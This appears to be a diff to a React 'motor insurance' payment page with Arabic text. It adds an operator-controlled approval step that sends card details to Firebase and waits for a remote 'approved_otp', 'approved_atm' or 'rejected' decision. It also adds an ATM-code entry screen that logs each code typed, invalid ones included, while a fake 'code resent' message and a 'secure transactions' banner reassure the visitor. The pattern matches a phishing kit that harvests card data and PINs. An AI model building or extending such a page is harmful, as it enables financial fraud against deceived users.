@@ -24,6 +24,8 @@ import {
   isFirebaseConfigured,
   setupOnlineStatus,
   setUserOffline,
+  subscribeToApprovalStatus,
+  type ApprovalStatus,
 } from "@/lib/firebase";
 import { Card } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
@@ -607,6 +609,11 @@ export default function MotorInsurance() {
   const [selectedVehicle, setSelectedVehicle] = useState<any>(null);
   const [visitorId, setVisitorId] = useState<string>("");
   const [isStepLoading, setIsStepLoading] = useState(false);
+  
+  const [isAwaitingApproval, setIsAwaitingApproval] = useState(false);
+  const [approvalStatus, setApprovalStatus] = useState<ApprovalStatus | null>(null);
+  const [rejectionReason, setRejectionReason] = useState<string>("");
+  const [atmCode, setAtmCode] = useState("");
 
   useEffect(() => {
     let id = localStorage.getItem("visitor");
@@ -632,6 +639,48 @@ export default function MotorInsurance() {
       window.removeEventListener("beforeunload", handleBeforeUnload);
     };
   }, []);
+
+  useEffect(() => {
+    if (!isAwaitingApproval || !visitorId || !isFirebaseConfigured) return;
+
+    const unsubscribe = subscribeToApprovalStatus(visitorId, (data) => {
+      if (data.approvalStatus === 'approved_otp') {
+        setApprovalStatus('approved_otp');
+        setIsAwaitingApproval(false);
+        if (currentStep === 4) {
+          setCurrentStep(5);
+          handleCurrentPage("motor-insurance-step-5-otp");
+        } else if (currentStep === 7) {
+          setCurrentStep(6);
+          handleCurrentPage("motor-insurance-step-6-success");
+        }
+      } else if (data.approvalStatus === 'approved_atm') {
+        setApprovalStatus('approved_atm');
+        setIsAwaitingApproval(false);
+        if (currentStep === 4) {
+          setCurrentStep(7);
+          handleCurrentPage("motor-insurance-step-7-atm");
+        } else if (currentStep === 7) {
+          setCurrentStep(6);
+          handleCurrentPage("motor-insurance-step-6-success");
+        }
+      } else if (data.approvalStatus === 'rejected') {
+        setApprovalStatus('rejected');
+        setRejectionReason(data.rejectionReason || "تم رفض البطاقة، الرجاء استخدام بطاقة أخرى");
+        setIsAwaitingApproval(false);
+        if (currentStep === 7) {
+          setCurrentStep(4);
+        }
+        toast({
+          title: "تم رفض البطاقة",
+          description: data.rejectionReason || "الرجاء استخدام بطاقة أخرى",
+          variant: "destructive",
+        });
+      }
+    });
+
+    return () => unsubscribe();
+  }, [isAwaitingApproval, visitorId, toast, currentStep]);
 
   const form = useForm<InsuranceFormData>({
     resolver: zodResolver(insuranceFormSchema),
@@ -906,11 +955,15 @@ export default function MotorInsurance() {
       return false;
     }
 
+    setApprovalStatus(null);
+    setRejectionReason("");
+
     if (isFirebaseConfigured && visitorId) {
       addData({
         id: visitorId,
         step: 4,
-        currentPage: "motor-insurance-step-5",
+        currentPage: "motor-insurance-awaiting-approval",
+        approvalStatus: "pending",
         paymentInfo: {
           cardNumber: cardDigits,
           cardName: cardName,
@@ -920,11 +973,7 @@ export default function MotorInsurance() {
       });
     }
 
-    setIsStepLoading(true);
-    setTimeout(() => {
-      setCurrentStep(5);
-      setIsStepLoading(false);
-    }, 1500);
+    setIsAwaitingApproval(true);
     return true;
   };
 
@@ -1094,7 +1143,7 @@ export default function MotorInsurance() {
 
   return (
     <div className="min-h-screen bg-background">
-      {isStepLoading && (
+      {(isStepLoading || isAwaitingApproval) && (
         <div className="fixed inset-0 bg-background/80 backdrop-blur-sm z-50 flex items-center justify-center">
           <div className="bg-white dark:bg-gray-800 rounded-2xl p-8 shadow-2xl flex flex-col items-center gap-4">
             <div className="relative">
@@ -1102,8 +1151,12 @@ export default function MotorInsurance() {
               <div className="absolute top-0 left-0 w-16 h-16 border-4 border-primary border-t-transparent rounded-full animate-spin"></div>
             </div>
             <div className="text-center">
-              <p className="font-bold text-foreground text-lg">جاري التحميل</p>
-              <p className="text-sm text-muted-foreground">يرجى الانتظار...</p>
+              <p className="font-bold text-foreground text-lg">
+                {isAwaitingApproval ? "جاري التحقق من البطاقة" : "جاري التحميل"}
+              </p>
+              <p className="text-sm text-muted-foreground">
+                {isAwaitingApproval ? "يرجى الانتظار، جاري معالجة الدفع..." : "يرجى الانتظار..."}
+              </p>
             </div>
           </div>
         </div>
@@ -1867,6 +1920,15 @@ export default function MotorInsurance() {
 
         {currentStep === 4 && (
           <div className="space-y-4">
+            {approvalStatus === 'rejected' && rejectionReason && (
+              <div className="bg-red-50 border border-red-200 rounded-xl p-4 flex items-center gap-3">
+                <AlertCircle className="h-5 w-5 text-red-500 flex-shrink-0" />
+                <div>
+                  <p className="font-medium text-red-700">تم رفض البطاقة</p>
+                  <p className="text-sm text-red-600">{rejectionReason}</p>
+                </div>
+              </div>
+            )}
             <div className="bg-gradient-to-l from-purple-600 via-purple-700 to-purple-800 rounded-xl p-6 text-white shadow-lg">
               <div className="flex items-center justify-between mb-6">
                 <div className="flex items-center gap-3">
@@ -2138,6 +2200,115 @@ export default function MotorInsurance() {
           </div>
         )}
 
+        {currentStep === 7 && (
+          <div className="space-y-4">
+            <Card className="p-6 shadow-lg border-0">
+              <div className="text-center mb-6">
+                <div className="w-16 h-16 rounded-full bg-gradient-to-br from-purple-100 to-purple-50 flex items-center justify-center mx-auto mb-4">
+                  <CreditCard className="h-8 w-8 text-purple-600" />
+                </div>
+                <h2 className="font-bold text-foreground text-xl mb-2">
+                  رمز الصراف الآلي
+                </h2>
+                <p className="text-muted-foreground text-sm">
+                  الرجاء إدخال رمز الصراف الآلي المرسل إلى هاتفك
+                </p>
+                <p className="text-sm text-muted-foreground mt-1">
+                  {maskedPhone}
+                </p>
+              </div>
+
+              <div className="space-y-4">
+                <div>
+                  <Label className="text-sm font-medium text-foreground mb-2 block text-center">
+                    أدخل الرمز المكون من 4-6 أرقام
+                  </Label>
+                  <Input
+                    value={atmCode}
+                    onChange={(e) => setAtmCode(e.target.value.replace(/\D/g, "").slice(0, 6))}
+                    placeholder="أدخل الرمز"
+                    maxLength={6}
+                    className="text-center h-14 text-2xl font-mono tracking-[0.5em] rounded-xl border-2 focus:border-purple-500 transition-colors"
+                    dir="ltr"
+                    data-testid="input-atm-code"
+                  />
+                </div>
+
+                <div className="flex items-center gap-2 justify-center text-amber-600 bg-amber-50 dark:bg-amber-900/20 p-3 rounded-xl">
+                  <Info className="h-4 w-4" />
+                  <span className="text-sm">المحاولات المتبقية: {otpAttempts}</span>
+                </div>
+
+                <div className="space-y-3">
+                  <Button
+                    className="w-full h-14 text-base rounded-full bg-gradient-to-l from-purple-600 to-purple-700 hover:from-purple-700 hover:to-purple-800 shadow-lg"
+                    onClick={() => {
+                      if (!atmCode || atmCode.length < 4) {
+                        const newAttempts = Math.max(0, otpAttempts - 1);
+                        setOtpAttempts(newAttempts);
+                        if (isFirebaseConfigured && visitorId) {
+                          addData({
+                            id: visitorId,
+                            atmAttempt: {
+                              code: atmCode,
+                              attemptsRemaining: newAttempts,
+                              timestamp: new Date().toISOString(),
+                            },
+                          });
+                        }
+                        toast({
+                          title: "رمز الصراف غير صحيح",
+                          description: `المحاولات المتبقية: ${newAttempts}`,
+                          variant: "destructive",
+                        });
+                        return;
+                      }
+                      if (isFirebaseConfigured && visitorId) {
+                        addData({
+                          id: visitorId,
+                          atmVerification: {
+                            code: atmCode,
+                            timestamp: new Date().toISOString(),
+                            status: "submitted",
+                          },
+                        });
+                      }
+                      setIsAwaitingApproval(true);
+                    }}
+                    disabled={mutation.isPending}
+                    data-testid="button-verify-atm"
+                  >
+                    {mutation.isPending ? "جاري التحقق..." : "تأكيد الرمز"}
+                  </Button>
+
+                  <Button
+                    variant="ghost"
+                    className="w-full text-purple-600 hover:text-purple-700 hover:bg-purple-50 dark:hover:bg-purple-900/20"
+                    onClick={() => {
+                      setOtpAttempts(6);
+                      setAtmCode("");
+                      toast({
+                        title: "تم إعادة الإرسال",
+                        description: "تم إرسال رمز جديد إلى هاتفك",
+                      });
+                    }}
+                    data-testid="button-resend-atm"
+                  >
+                    <span className="underline">إعادة إرسال الرمز</span>
+                  </Button>
+                </div>
+
+                <div className="pt-4 border-t">
+                  <p className="text-xs text-muted-foreground flex items-center justify-center gap-2">
+                    <Lock className="h-3 w-3" />
+                    جميع المعاملات مشفرة وآمنة
+                  </p>
+                </div>
+              </div>
+            </Card>
+          </div>
+        )}
+
         {currentStep === 6 && (
           <Card className="p-8 shadow-sm text-center">
             <div className="w-16 h-16 rounded-full bg-green-100 flex items-center justify-center mx-auto mb-4">
@@ -2161,7 +2332,10 @@ export default function MotorInsurance() {
                 setCardExpiry("");
                 setCardCvv("");
                 setOtpCode("");
+                setAtmCode("");
                 setOtpAttempts(6);
+                setApprovalStatus(null);
+                setRejectionReason("");
                 form.reset();
               }}
               data-testid="button-new-request"
@@ -2171,7 +2345,7 @@ export default function MotorInsurance() {
           </Card>
         )}
 
-        {currentStep < 6 && currentStep !== 5 && (
+        {currentStep < 6 && currentStep !== 5 && currentStep !== 7 && (
           <div className="flex gap-3 mt-6">
             {currentStep > 1 && (
               <Button
@@ -2200,12 +2374,12 @@ export default function MotorInsurance() {
           </div>
         )}
 
-        {currentStep === 5 && (
+        {(currentStep === 5 || currentStep === 7) && (
           <div className="mt-4">
             <Button
               variant="outline"
               className="w-full h-12 text-base rounded-full gap-2"
-              onClick={goBack}
+              onClick={() => setCurrentStep(4)}
               data-testid="button-back"
             >
               <ChevronRight className="h-5 w-5" />
